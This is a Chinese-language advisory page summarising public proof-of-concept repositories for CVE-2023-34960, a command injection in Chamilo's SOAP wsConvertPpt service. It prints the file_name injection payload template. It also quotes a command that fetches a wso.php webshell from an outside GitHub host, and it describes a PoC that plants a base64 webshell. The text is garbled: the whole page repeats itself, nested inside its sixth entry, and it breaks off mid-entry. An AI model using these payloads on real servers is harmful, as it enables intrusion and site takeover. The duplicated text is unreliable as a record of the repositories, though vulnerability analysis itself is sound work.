# CVE-2023-34960

> 📦 该CVE有 **7** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-34960-Aituglo_CVE-2023-34960.md](../2023/CVE-2023-34960-Aituglo_CVE-2023-34960.md)

## CVE-2023-34960-Chamilo-命令注入

**漏洞编号:** CVE-2023-34960

**漏洞类型:** 命令注入

**影响应用:** Chamilo

**危害等级:** 高危，允许远程代码执行

**影响版本:** 1.11.* up to v1.11.18

**利用条件:** 需要能够访问 Chamilo 实例的 web 服务接口 (additional_webservices.php)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-34960 是 Chamilo 1.11 到 1.11.18 版本中 wsConvertPpt 组件的一个命令注入漏洞。攻击者可以通过构造包含恶意命令的 PowerPoint 文件名，通过 SOAP API 调用 wsConvertPpt 函数来执行任意系统命令。

**漏洞利用方式：**

1.  **攻击入口:** 攻击者需要能够访问 `additional_webservices.php` Web 服务接口。
2.  **SOAP 请求构造:** 攻击者构造一个 SOAP 请求，其中包含 `wsConvertPpt` 方法的调用。
3.  **命令注入:**  在 SOAP 请求的 `file_name` 参数中，攻击者插入包含恶意命令的字符串。由于未进行充分的输入验证和过滤，Chamilo 会将此字符串传递给系统命令执行函数。
4.  **命令执行:**  当 Chamilo 尝试处理（实际上可能不会处理） PowerPoint 文件时，注入的命令会被执行。

**POC 分析:**

提供的 POC 代码 `poc.py` 的工作原理如下：

1.  **构造 SOAP 请求:**  Python 脚本构造包含恶意 `file_name` 的 SOAP 请求，格式化字符串将用户提供的 `command` 插入到 `file_name` 中。
2.  **发送请求:**  脚本使用 `requests` 库向目标 Chamilo 实例的 `additional_webservices.php` 发送 POST 请求，请求体是构造的 SOAP 消息。
3.  **验证响应:**  脚本检查 HTTP 响应状态码是否为 200，以及响应正文中是否包含字符串 `wsConvertPptResponse`，以此判断漏洞是否可能存在以及命令是否可能执行成功。
4.  **命令执行与输出:** 通过 `-c` 参数可以执行任意指令.

**有效性评估:**
根据漏洞描述，搜索引擎结果以及提供的 POC 代码分析，此漏洞利用是有效的。

**投毒风险评估:**

分析提供的 POC 代码，没有发现任何可疑的或恶意的代码，该脚本目的明确，即利用命令注入漏洞，因此不存在投毒的风险。



**项目地址:** [Aituglo/CVE-2023-34960](https://github.com/Aituglo/CVE-2023-34960)

**漏洞详情:** [CVE-2023-34960](https://nvd.nist.gov/vuln/detail/CVE-2023-34960)

---

## POC #2

**来源**: [CVE-2023-34960-Jenderal92_CHAMILO-CVE-2023-34960.md](../2023/CVE-2023-34960-Jenderal92_CHAMILO-CVE-2023-34960.md)

## CVE-2023-34960-Chamilo-命令注入

**漏洞编号:** CVE-2023-34960

**漏洞类型:** 命令注入

**影响应用:** Chamilo

**危害等级:** 高危，可导致远程代码执行

**影响版本:** v1.11.* up to v1.11.18

**利用条件:** 需要能够访问Chamilo服务器上的`additional_webservices.php`，并发送特制的SOAP请求。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于Chamilo的`wsConvertPpt`组件中，允许攻击者通过构造包含恶意命令的PowerPoint文件名，利用SOAP API调用执行任意命令。

**有效性分析：**

根据漏洞库信息、搜索引擎结果以及提供的PoC代码，该漏洞利用的有效性较高。多个来源都确认了该漏洞的存在，并且提供了利用该漏洞的PoC代码。Metasploit也集成了该漏洞的利用模块，进一步证明了其有效性。

**投毒风险分析：**

查看提供的PoC代码（`CVE-2023-34960.py`）后，发现其主要功能是：

1.  构造包含恶意命令的SOAP请求，发送到`/main/webservices/additional_webservices.php`。
2.  恶意命令是将一段PHP代码（base64编码的webshell）写入到 `shin.php` 文件中.
3.  尝试访问`/main/inc/lib/ppt2png/1.php`以确认webshell是否上传成功。

`README.md` 文件提供了简单的使用说明，没有发现明显的恶意代码。

**潜在的投毒风险在于：**

*   PoC中使用的webshell功能简单，可能只是为了演示漏洞。攻击者可以修改PoC，植入更复杂的后门代码。
*   PoC在成功利用漏洞后，会在目标服务器上留下webshell文件（`/main/inc/lib/ppt2png/1.php`），如果该文件被其他攻击者发现，可能会被用于进一步的攻击。

该风险是由于漏洞利用本身造成的后门，并非作者故意添加的恶意代码，判定投毒风险为10%。

**利用方式：**

1.  攻击者需要确定目标Chamilo服务器的版本在v1.11.* 到 v1.11.18之间。
2.  攻击者需要向目标服务器的`/main/webservices/additional_webservices.php`发送特制的SOAP请求。
3.  SOAP请求中的`file_name`参数需要包含恶意命令。PoC中使用的命令是将base64编码的PHP webshell写入`/main/inc/lib/ppt2png/1.php`文件。
4.  攻击者可以通过访问`/main/inc/lib/ppt2png/1.php`来执行webshell，从而控制目标服务器。
5.  该脚本会自动在 `vuln_chamilo.txt` 和 `shell_chamilo.txt` 中记录存在漏洞的URL以及成功获取shell的URL。

**项目地址:** [Jenderal92/CHAMILO-CVE-2023-34960](https://github.com/Jenderal92/CHAMILO-CVE-2023-34960)

**漏洞详情:** [CVE-2023-34960](https://nvd.nist.gov/vuln/detail/CVE-2023-34960)

---

## POC #3

**来源**: [CVE-2023-34960-Mantodkaz_CVE-2023-34960.md](../2023/CVE-2023-34960-Mantodkaz_CVE-2023-34960.md)

## CVE-2023-34960-Chamilo-命令注入

**漏洞编号:** CVE-2023-34960

**漏洞类型:** 命令注入

**影响应用:** Chamilo

**危害等级:** 高危，可导致远程代码执行

**影响版本:** v1.11.* up to v1.11.18

**利用条件:** 需要可以访问Chamilo的`additional_webservices.php`。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-34960 是 Chamilo v1.11.* 到 v1.11.18 版本中 `wsConvertPpt` 组件中的一个命令注入漏洞。攻击者可以通过构造恶意 SOAP API 调用，在 PowerPoint 名称中注入命令来执行任意代码。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且有公开的PoC代码。PoC代码 `finder.py` 利用 SOAP 请求的 `wsConvertPpt` 方法，在 `file_name` 参数中插入命令。如果目标存在漏洞，这段代码会尝试执行 `uname -a;pwd;wget https://raw.githubusercontent.com/Mantodkaz/bekdur/main/php/wso.php;rm wso.php.1`。该命令会获取系统信息，当前路径，下载 webshell (wso.php)，然后删除下载文件重命名后的文件。如果执行成功，会在服务器上留下webshell。

**投毒风险：**
PoC代码中存在一定的投毒风险。首先，`wget`命令下载的 `wso.php` 文件来自外部资源 `https://raw.githubusercontent.com/Mantodkaz/bekdur/main/php/wso.php`。作者可以随时修改此文件，使其包含恶意代码。其次，PoC中硬编码的下载webshell行为，若webshell包含恶意逻辑，则存在风险。综合考虑，投毒风险约为 10%。这个风险评估考虑了webshell本身的潜在危害，以及 PoC 利用的直接性。

**利用方式：**
1.  攻击者首先需要确定目标 Chamilo 系统的 URL。
2.  构造一个包含恶意命令的 SOAP 请求，目标端点是 `main/webservices/additional_webservices.php`。
3.  将构造好的 SOAP 请求发送到目标系统。
4.  如果目标系统存在漏洞，恶意命令将被执行。在这个 PoC 中，命令会下载一个 webshell 并将其放置在目标服务器上。
5.  攻击者可以通过访问 webshell 来进一步控制系统。

**项目地址:** [Mantodkaz/CVE-2023-34960](https://github.com/Mantodkaz/CVE-2023-34960)

**漏洞详情:** [CVE-2023-34960](https://nvd.nist.gov/vuln/detail/CVE-2023-34960)

---

## POC #4

**来源**: [CVE-2023-34960-ThatNotEasy_CVE-2023-34960.md](../2023/CVE-2023-34960-ThatNotEasy_CVE-2023-34960.md)

## CVE-2023-34960-Chamilo-命令注入

**漏洞编号:** CVE-2023-34960

**漏洞类型:** 命令注入

**影响应用:** Chamilo

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 1.11.* up to 1.11.18

**利用条件:** 需要网络访问，目标系统开启wsConvertPpt组件的SOAP API。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-34960是Chamilo 1.11.18及更早版本中wsConvertPpt组件存在的一个命令注入漏洞。攻击者可以通过构造恶意的PowerPoint文件名，并通过SOAP API调用wsConvertPpt组件来执行任意命令。

**有效性评估：**

漏洞库信息、搜索引擎结果和提供的PoC代码均表明该漏洞是有效的。多个来源都描述了相同的漏洞原理，即通过SOAP API注入恶意命令。提供的PoC代码是一个Python脚本，它构造一个包含恶意PowerPoint文件名的SOAP请求，利用该漏洞在目标系统上执行命令。Metasploit也收录了此漏洞的利用模块,可以佐证漏洞的有效性。

**投毒风险评估：**

PoC代码本身未发现明显的恶意代码（例如，下载和执行任意文件）。然而，存在轻微的投毒风险，概率约为10%。这种风险主要来自以下几个方面：

*   **依赖项：** PoC代码依赖于`requirements.txt`中指定的Python库。虽然常见库如`requests`是安全的，但如果`requirements.txt`中包含不常见的或来源不明的库，则可能存在恶意代码。需要人工审核`requirements.txt`文件，检查是否存在可疑的依赖关系。
*   **代码逻辑：** 虽然主要代码看起来是直接利用漏洞，但作者可以在脚本中添加隐蔽的后门或数据收集代码，例如向特定服务器发送目标信息。
*   **作者声明：** 作者免责声明暗示该脚本存在潜在风险，用户需要自行承担使用风险。
*  **README.md中的图片链接:** 链接到外部资源，可能存在被替换为恶意图片的风险。

**利用方式：**

1.  **目标确定：** 确定目标Chamilo实例的版本是否在受影响范围内 (1.11.* up to 1.11.18)。
2.  **SOAP请求构造：** 构造一个SOAP请求，其中`file_name`参数包含恶意命令。命令注入发生在PowerPoint文件名处理过程中。
3.  **API调用：** 将构造的SOAP请求发送到Chamilo的wsConvertPpt组件的API端点。通常可以通过分析Chamilo的`additional_webservices.php`文件来确定SOAP端点。
4.  **命令执行：** 如果漏洞利用成功，服务器将执行注入的命令。攻击者可以执行系统命令，例如反弹shell或读取敏感文件。

提供的PoC代码中，注入payload如下：

```xml
<value xsi:type="xsd:string">`{{}}`.pptx'|" |{command}||a #</value>
```

其中`{command}`将被替换为攻击者希望执行的命令。

总而言之，该漏洞利用的有效性高，但存在轻微的投毒风险。用户在使用PoC代码时应谨慎，并仔细检查代码和依赖项。

**项目地址:** [ThatNotEasy/CVE-2023-34960](https://github.com/ThatNotEasy/CVE-2023-34960)

**漏洞详情:** [CVE-2023-34960](https://nvd.nist.gov/vuln/detail/CVE-2023-34960)

---

## POC #5

**来源**: [CVE-2023-34960-YongYe-Security_CVE-2023-34960.md](../2023/CVE-2023-34960-YongYe-Security_CVE-2023-34960.md)

## CVE-2023-34960-Chamilo-命令注入

**漏洞编号:** CVE-2023-34960

**漏洞类型:** 命令注入

**影响应用:** Chamilo

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** v1.11.* up to v1.11.18

**利用条件:** 需要网络访问，目标系统运行着存在漏洞的Chamilo版本，并且可以访问到/main/webservices/additional_webservices.php SOAP接口

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Chamilo的wsConvertPpt组件中。攻击者可以通过构造恶意的SOAP请求，在PPT文件名中注入命令，从而执行任意代码。 

**有效性分析：**
提供的POC代码`CVE-2023-34960.py`看起来有效。它构造了一个带有恶意`file_name`的SOAP请求，发送到`/main/webservices/additional_webservices.php`。代码会打印执行结果，并将存在漏洞的URL保存到`Kill_ALL.txt`。

**投毒风险分析：**
查看了提供的`CVE-2023-34960.py`和`README.md`的内容，没有发现任何明显的投毒代码。EXP的代码逻辑是，发送SOAP请求，获取并打印返回结果，没有发现恶意行为。`README.md`文件主要是使用说明，没有发现可疑代码。

**利用方式：**
1.  **确定目标：** 确定要攻击的Chamilo实例的URL。
2.  **构造SOAP请求：** 使用POC脚本，构造一个SOAP请求，其中`file_name`包含要执行的命令。命令注入发生在PPT文件名，payload的格式为``{{}}`.pptx'|" |{command}||a #`，其中`{command}`是要执行的命令。
3.  **发送请求：** 将SOAP请求发送到`/main/webservices/additional_webservices.php`。
4.  **执行命令：** 服务器执行注入的命令。
5.  **获取结果：**  从SOAP响应中提取命令执行结果。

**总结：**
该漏洞利用过程相对简单，利用POC发送构造好的SOAP数据包即可完成利用。

**项目地址:** [YongYe-Security/CVE-2023-34960](https://github.com/YongYe-Security/CVE-2023-34960)

**漏洞详情:** [CVE-2023-34960](https://nvd.nist.gov/vuln/detail/CVE-2023-34960)

---

## POC #6

**来源**: [CVE-2023-34960-dvtarsoul_ChExp.md](../2023/CVE-2023-34960-dvtarsoul_ChExp.md)

# CVE-2023-34960

> 📦 该CVE有 **7** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-34960-Aituglo_CVE-2023-34960.md](../2023/CVE-2023-34960-Aituglo_CVE-2023-34960.md)

## CVE-2023-34960-Chamilo-命令注入

**漏洞编号:** CVE-2023-34960

**漏洞类型:** 命令注入

**影响应用:** Chamilo

**危害等级:** 高危，允许远程代码执行

**影响版本:** 1.11.* up to v1.11.18

**利用条件:** 需要能够访问 Chamilo 实例的 web 服务接口 (additional_webservices.php)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-34960 是 Chamilo 1.11 到 1.11.18 版本中 wsConvertPpt 组件的一个命令注入漏洞。攻击者可以通过构造包含恶意命令的 PowerPoint 文件名，通过 SOAP API 调用 wsConvertPpt 函数来执行任意系统命令。

**漏洞利用方式：**

1.  **攻击入口:** 攻击者需要能够访问 `additional_webservices.php` Web 服务接口。
2.  **SOAP 请求构造:** 攻击者构造一个 SOAP 请求，其中包含 `wsConvertPpt` 方法的调用。
3.  **命令注入:**  在 SOAP 请求的 `file_name` 参数中，攻击者插入包含恶意命令的字符串。由于未进行充分的输入验证和过滤，Chamilo 会将此字符串传递给系统命令执行函数。
4.  **命令执行:**  当 Chamilo 尝试处理（实际上可能不会处理） PowerPoint 文件时，注入的命令会被执行。

**POC 分析:**

提供的 POC 代码 `poc.py` 的工作原理如下：

1.  **构造 SOAP 请求:**  Python 脚本构造包含恶意 `file_name` 的 SOAP 请求，格式化字符串将用户提供的 `command` 插入到 `file_name` 中。
2.  **发送请求:**  脚本使用 `requests` 库向目标 Chamilo 实例的 `additional_webservices.php` 发送 POST 请求，请求体是构造的 SOAP 消息。
3.  **验证响应:**  脚本检查 HTTP 响应状态码是否为 200，以及响应正文中是否包含字符串 `wsConvertPptResponse`，以此判断漏洞是否可能存在以及命令是否可能执行成功。
4.  **命令执行与输出:** 通过 `-c` 参数可以执行任意指令.

**有效性评估:**
根据漏洞描述，搜索引擎结果以及提供的 POC 代码分析，此漏洞利用是有效的。

**投毒风险评估:**

分析提供的 POC 代码，没有发现任何可疑的或恶意的代码，该脚本目的明确，即利用命令注入漏洞，因此不存在投毒的风险。



**项目地址:** [Aituglo/CVE-2023-34960](https://github.com/Aituglo/CVE-2023-34960)

**漏洞详情:** [CVE-2023-34960](https://nvd.nist.gov/vuln/detail/CVE-2023-34960)

---

## POC #2

**来源**: [CVE-2023-34960-Jenderal92_CHAMILO-CVE-2023-34960.md](../2023/CVE-2023-34960-Jenderal92_CHAMILO-CVE-2023-34960.md)

## CVE-2023-34960-Chamilo-命令注入

**漏洞编号:** CVE-2023-34960

**漏洞类型:** 命令注入

**影响应用:** Chamilo

**危害等级:** 高危，可导致远程代码执行

**影响版本:** v1.11.* up to v1.11.18

**利用条件:** 需要能够访问Chamilo服务器上的`additional_webservices.php`，并发送特制的SOAP请求。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于Chamilo的`wsConvertPpt`组件中，允许攻击者通过构造包含恶意命令的PowerPoint文件名，利用SOAP API调用执行任意命令。

**有效性分析：**

根据漏洞库信息、搜索引擎结果以及提供的PoC代码，该漏洞利用的有效性较高。多个来源都确认了该漏洞的存在，并且提供了利用该漏洞的PoC代码。Metasploit也集成了该漏洞的利用模块，进一步证明了其有效性。

**投毒风险分析：**

查看提供的PoC代码（`CVE-2023-34960.py`）后，发现其主要功能是：

1.  构造包含恶意命令的SOAP请求，发送到`/main/webservices/additional_webservices.php`。
2.  恶意命令是将一段PHP代码（base64编码的webshell）写入到 `shin.php` 文件中.
3.  尝试访问`/main/inc/lib/ppt2png/1.php`以确认webshell是否上传成功。

`README.md` 文件提供了简单的使用说明，没有发现明显的恶意代码。

**潜在的投毒风险在于：**

*   PoC中使用的webshell功能简单，可能只是为了演示漏洞。攻击者可以修改PoC，植入更复杂的后门代码。
*   PoC在成功利用漏洞后，会在目标服务器上留下webshell文件（`/main/inc/lib/ppt2png/1.php`），如果该文件被其他攻击者发现，可能会被用于进一步的攻击。

该风险是由于漏洞利用本身造成的后门，并非作者故意添加的恶意代码，判定投毒风险为10%。

**利用方式：**

1.  攻击者需要确定目标Chamilo服务器的版本在v1.11.* 到 v1.11.18之间。
2.  攻击者需要向目标服务器的`/main/webservices/additional_webservices.php`发送特制的SOAP请求。
3.  SOAP请求中的`file_name`参数需要包含恶意命令。PoC中使用的命令是将base64编码的PHP webshell写入`/main/inc/lib/ppt2png/1.php`文件。
4.  攻击者可以通过访问`/main/inc/lib/ppt2png/1.php`来执行webshell，从而控制目标服务器。
5.  该脚本会自动在 `vuln_chamilo.txt` 和 `shell_chamilo.txt` 中记录存在漏洞的URL以及成功获取shell的URL。

**项目地址:** [Jenderal92/CHAMILO-CVE-2023-34960](https://github.com/Jenderal92/CHAMILO-CVE-2023-34960)

**漏洞详情:** [CVE-2023-34960](https://nvd.nist.gov/vuln/detail/CVE-2023-34960)

---

## POC #3

**来源**: [CVE-2023-34960-Mantodkaz_CVE-2023-34960.md](../2023/CVE-2023-34960-Mantodkaz_CVE-2023-34960.md)

## CVE-2023-34960-Chamilo-命令注入

**漏洞编号:** CVE-2023-34960

**漏洞类型:** 命令注入

**影响应用:** Chamilo

**危害等级:** 高危，可导致远程代码执行

**影响版本:** v1.11.* up to v1.11.18

**利用条件:** 需要可以访问Chamilo的`additional_webservices.php`。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-34960 是 Chamilo v1.11.* 到 v1.11.18 版本中 `wsConvertPpt` 组件中的一个命令注入漏洞。攻击者可以通过构造恶意 SOAP API 调用，在 PowerPoint 名称中注入命令来执行任意代码。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且有公开的PoC代码。PoC代码 `finder.py` 利用 SOAP 请求的 `wsConvertPpt` 方法，在 `file_name` 参数中插入命令。如果目标存在漏洞，这段代码会尝试执行 `uname -a;pwd;wget https://raw.githubusercontent.com/Mantodkaz/bekdur/main/php/wso.php;rm wso.php.1`。该命令会获取系统信息，当前路径，下载 webshell (wso.php)，然后删除下载文件重命名后的文件。如果执行成功，会在服务器上留下webshell。

**投毒风险：**
PoC代码中存在一定的投毒风险。首先，`wget`命令下载的 `wso.php` 文件来自外部资源 `https://raw.githubusercontent.com/Mantodkaz/bekdur/main/php/wso.php`。作者可以随时修改此文件，使其包含恶意代码。其次，PoC中硬编码的下载webshell行为，若webshell包含恶意逻辑，则存在风险。综合考虑，投毒风险约为 10%。这个风险评估考虑了webshell本身的潜在危害，以及 PoC 利用的直接性。

**利用方式：**
1.  攻击者首先需要确定目标 Chamilo 系统的 URL。
2.  构造一个包含恶意命令的 SOAP 请求，目标端点是 `main/webservices/additional_webservices.php`。
3.  将构造好的 SOAP 请求发送到目标系统。
4.  如果目标系统存在漏洞，恶意命令将被执行。在这个 PoC 中，命令会下载一个 webshell 并将其放置在目标服务器上。
5.  攻击者可以通过访问 webshell 来进一步控制系统。

**项目地址:** [Mantodkaz/CVE-2023-34960](https://github.com/Mantodkaz/CVE-2023-34960)

**漏洞详情:** [CVE-2023-34960](https://nvd.nist.gov/vuln/detail/CVE-2023-34960)

---

## POC #4

**来源**: [CVE-2023-34960-ThatNotEasy_CVE-2023-34960.md](../2023/CVE-2023-34960-ThatNotEasy_CVE-2023-34960.md)

## CVE-2023-34960-Chamilo-命令注入

**漏洞编号:** CVE-2023-34960

**漏洞类型:** 命令注入

**影响应用:** Chamilo

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 1.11.* up to 1.11.18

**利用条件:** 需要网络访问，目标系统开启wsConvertPpt组件的SOAP API。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-34960是Chamilo 1.11.18及更早版本中wsConvertPpt组件存在的一个命令注入漏洞。攻击者可以通过构造恶意的PowerPoint文件名，并通过SOAP API调用wsConvertPpt组件来执行任意命令。

**有效性评估：**

漏洞库信息、搜索引擎结果和提供的PoC代码均表明该漏洞是有效的。多个来源都描述了相同的漏洞原理，即通过SOAP API注入恶意命令。提供的PoC代码是一个Python脚本，它构造一个包含恶意PowerPoint文件名的SOAP请求，利用该漏洞在目标系统上执行命令。Metasploit也收录了此漏洞的利用模块,可以佐证漏洞的有效性。

**投毒风险评估：**

PoC代码本身未发现明显的恶意代码（例如，下载和执行任意文件）。然而，存在轻微的投毒风险，概率约为10%。这种风险主要来自以下几个方面：

*   **依赖项：** PoC代码依赖于`requirements.txt`中指定的Python库。虽然常见库如`requests`是安全的，但如果`requirements.txt`中包含不常见的或来源不明的库，则可能存在恶意代码。需要人工审核`requirements.txt`文件，检查是否存在可疑的依赖关系。
*   **代码逻辑：** 虽然主要代码看起来是直接利用漏洞，但作者可以在脚本中添加隐蔽的后门或数据收集代码，例如向特定服务器发送目标信息。
*   **作者声明：** 作者免责声明暗示该脚本存在潜在风险，用户需要自行承担使用风险。
*  **README.md中的图片链接:** 链接到外部资源，可能存在被替换为恶意图片的风险。

**利用方式：**

1.  **目标确定：** 确定目标Chamilo实例的版本是否在受影响范围内 (1.11.* up to 1.11.18)。
2.  **SOAP请求构造：** 构造一个SOAP请求，其中`file_name`参数包含恶意命令。命令注入发生在PowerPoint文件名处理过程中。
3.  **API调用：** 将构造的SOAP请求发送到Chamilo的wsConvertPpt组件的API端点。通常可以通过分析Chamilo的`additional_webservices.php`文件来确定SOAP端点。
4.  **命令执行：** 如果漏洞利用成功，服务器将执行注入的命令。攻击者可以执行系统命令，例如反弹shell或读取敏感文件。

提供的PoC代码中，注入payload如下：

```xml
<value xsi:type="xsd:string">`{{}}`.pptx'|" |{command}||a #</value>
```

其中`{command}`将被替换为攻击者希望执行的命令。

总而言之，该漏洞利用的有效性高，但存在轻微的投毒风险。用户在使用PoC代码时应谨慎，并仔细检查代码和依赖项。

**项目地址:** [ThatNotEasy/CVE-2023-34960](https://github.com/ThatNotEasy/CVE-2023-34960)

**漏洞详情:** [CVE-2023-34960](https://nvd.nist.gov/vuln/detail/CVE-2023-34960)

---

## POC #5

**来源**: [CVE-2023-34960-YongYe-Security_CVE-2023-34960.md](../2023/CVE-2023-34960-YongYe-Security_CVE-2023-34960.md)

## CVE-2023-34960-Chamilo-命令注入

**漏洞编号:** CVE-2023-34960

**漏洞类型:** 命令注入

**影响应用:** Chamilo

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** v1.11.* up to v1.11.18

**利用条件:** 需要网络访问，目标系统运行着存在漏洞的Chamilo版本，并且可以访问到/main/webservices/additional_webservices.php SOAP接口

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Chamilo的wsConvertPpt组件中。攻击者可以通过构造恶意的SOAP请求，在PPT文件名中注入命令，从而执行任意代码。 

**有效性分析：**
提供的POC代码`CVE-2023-34960.py`看起来有效。它构造了一个带有恶意`file_name`的SOAP请求，发送到`/main/webservices/additional_webservices.php`。代码会打印执行结果，并将存在漏洞的URL保存到`Kill_ALL.txt`。

**投毒风险分析：**
查看了提供的`CVE-2023-34960.py`和`README.md`的内容，没有发现任何明显的投毒代码。EXP的代码逻辑是，发送SOAP请求，获取并打印返回结果，没有发现恶意行为。`README.md`文件主要是使用说明，没有发现可疑代码。

**利用方式：**
1.  **确定目标：** 确定要攻击的Chamilo实例的URL。
2.  **构造SOAP请求：** 使用POC脚本，构造一个SOAP请求，其中`file_name`包含要执行的命令。命令注入发生在PPT文件名，payload的格式为``{{}}`.pptx'|" |{command}||a #`，其中`{command}`是要执行的命令。
3.  **发送请求：** 将SOAP请求发送到`/main/webservices/additional_webservices.php`。
4.  **执行命令：** 服务器执行注入的命令。
5.  **获取结果：**  从SOAP响应中提取命令执行结果。

**总结：**
该漏洞利用过程相对简单，利用POC发送构造好的SOAP数据包即可完成利用。

**项目地址:** [YongYe-Security/CVE-2023-34960](https://github.com/YongYe-Security/CVE-2023-34960)

**漏洞详情:** [CVE-2023-34960](https://nvd.nist.gov/vuln/detail/CVE-2023-34960)

---

## POC #6

**来源**: [CVE-2023-34960-dvtarsoul_ChExp.md](../2023/CVE-2023-34960-dvtarsoul_ChExp.md)

# CVE-2023-34960

> 📦 该CVE有 **7** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-34960-Aituglo_CVE-2023-34960.md](../2023/CVE-2023-34960-Aituglo_CVE-2023-34960.md)

## CVE-2023-34960-Chamilo-命令注入

**漏洞编号:** CVE-2023-34960

**漏洞类型:** 命令注入

**影响应用:** Chamilo

**危害等级:** 高危，允许远程代码执行

**影响版本:** 1.11.* up to v1.11.18

**利用条件:** 需要能够访问 Chamilo 实例的 web 服务接口 (additional_webservices.php)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-34960 是 Chamilo 1.11 到 1.11.18 版本中 wsConvertPpt 组件的一个命令注入漏洞。攻击者可以通过构造包含恶意命令的 PowerPoint 文件名，通过 SOAP API 调用 wsConvertPpt 函数来执行任意系统命令。

**漏洞利用方式：**

1.  **攻击入口:** 攻击者需要能够访问 `additional_webservices.php` Web 服务接口。
2.  **SOAP 请求构造:** 攻击者构造一个 SOAP 请求，其中包含 `wsConvertPpt` 方法的调用。
3.  **命令注入:**  在 SOAP 请求的 `file_name` 参数中，攻击者插入包含恶意命令的字符串。由于未进行充分的输入验证和过滤，Chamilo 会将此字符串传递给系统命令执行函数。
4.  **命令执行:**  当 Chamilo 尝试处理（实际上可能不会处理） PowerPoint 文件时，注入的命令会被执行。

**POC 分析:**

提供的 POC 代码 `poc.py` 的工作原理如下：

1.  **构造 SOAP 请求:**  Python 脚本构造包含恶意 `file_name` 的 SOAP 请求，格式化字符串将用户提供的 `command` 插入到 `file_name` 中。
2.  **发送请求:**  脚本使用 `requests` 库向目标 Chamilo 实例的 `additional_webservices.php` 发送 POST 请求，请求体是构造的 SOAP 消息。
3.  **验证响应:**  脚本检查 HTTP 响应状态码是否为 200，以及响应正文中是否包含字符串 `wsConvertPptResponse`，以此判断漏洞是否可能存在以及命令是否可能执行成功。
4.  **命令执行与输出:** 通过 `-c` 参数可以执行任意指令.

**有效性评估:**
根据漏洞描述，搜索引擎结果以及提供的 POC 代码分析，此漏洞利用是有效的。

**投毒风险评估:**

分析提供的 POC 代码，没有发现任何可疑的或恶意的代码，该脚本目的明确，即利用命令注入漏洞，因此不存在投毒的风险。



**项目地址:** [Aituglo/CVE-2023-34960](https://github.com/Aituglo/CVE-2023-34960)

**漏洞详情:** [CVE-2023-34960](https://nvd.nist.gov/vuln/detail/CVE-2023-34960)

---

## POC #2

**来源**: [CVE-2023-34960-Jenderal92_CHAMILO-CVE-2023-34960.md](../2023/CVE-2023-34960-Jenderal92_CHAMILO-CVE-2023-34960.md)

## CVE-2023-34960-Chamilo-命令注入

**漏洞编号:** CVE-2023-34960

**漏洞类型:** 命令注入

**影响应用:** Chamilo

**危害等级:** 高危，可导致远程代码执行

**影响版本:** v1.11.* up to v1.11.18

**利用条件:** 需要能够访问Chamilo服务器上的`additional_webservices.php`，并发送特制的SOAP请求。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于Chamilo的`wsConvertPpt`组件中，允许攻击者通过构造包含恶意命令的PowerPoint文件名，利用SOAP API调用执行任意命令。

**有效性分析：**

根据漏洞库信息、搜索引擎结果以及提供的PoC代码，该漏洞利用的有效性较高。多个来源都确认了该漏洞的存在，并且提供了利用该漏洞的PoC代码。Metasploit也集成了该漏洞的利用模块，进一步证明了其有效性。

**投毒风险分析：**

查看提供的PoC代码（`CVE-2023-34960.py`）后，发现其主要功能是：

1.  构造包含恶意命令的SOAP请求，发送到`/main/webservices/additional_webservices.php`。
2.  恶意命令是将一段PHP代码（base64编码的webshell）写入到 `shin.php` 文件中.
3.  尝试访问`/main/inc/lib/ppt2png/1.php`以确认webshell是否上传成功。

`README.md` 文件提供了简单的使用说明，没有发现明显的恶意代码。

**潜在的投毒风险在于：**

*   PoC中使用的webshell功能简单，可能只是为了演示漏洞。攻击者可以修改PoC，植入更复杂的后门代码。
*   PoC在成功利用漏洞后，会在目标服务器上留下webshell文件（`/main/inc/lib/ppt2png/1.php`），如果该文件被其他攻击者发现，可能会被用于进一步的攻击。

该风险是由于漏洞利用本身造成的后门，并非作者故意添加的恶意代码，判定投毒风险为10%。

**利用方式：**

1.  攻击者需要确定目标Chamilo服务器的版本在v1.11.* 到 v1.11.18之间。
2.  攻击者需要向目标服务器的`/main/webservices/additional_webservices.php`发送特制的SOAP请求。
3.  SOAP请求中的`file_name`参数需要包含恶意命令。PoC中使用的命令是将base64编码的PHP webshell写入`/main/inc/lib/ppt2png/1.php`文件。
4.  攻击者可以通过访问`/main/inc/lib/ppt2png/1.php`来执行webshell，从而控制目标服务器。
5.  该脚本会自动在 `vuln_chamilo.txt` 和 `shell_chamilo.txt` 中记录存在漏洞的URL以及成功获取shell的URL。

**项目地址:** [Jenderal92/CHAMILO-CVE-2023-34960](https://github.com/Jenderal92/CHAMILO-CVE-2023-34960)

**漏洞详情:** [CVE-2023-34960](https://nvd.nist.gov/vuln/detail/CVE-2023-34960)

---

## POC #3

**来源**: [CVE-2023-34960-Mantodkaz_CVE-2023-34960.md](../2023/CVE-2023-34960-Mantodkaz_CVE-2023-34960.md)

## CVE-2023-34960-Chamilo-命令注入

**漏洞编号:** CVE-2023-34960

**漏洞类型:** 命令注入

**影响应用:** Chamilo

**危害等级:** 高危，可导致远程代码执行

**影响版本:** v1.11.* up to v1.11.18

**利用条件:** 需要可以访问Chamilo的`additional_webservices.php`。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

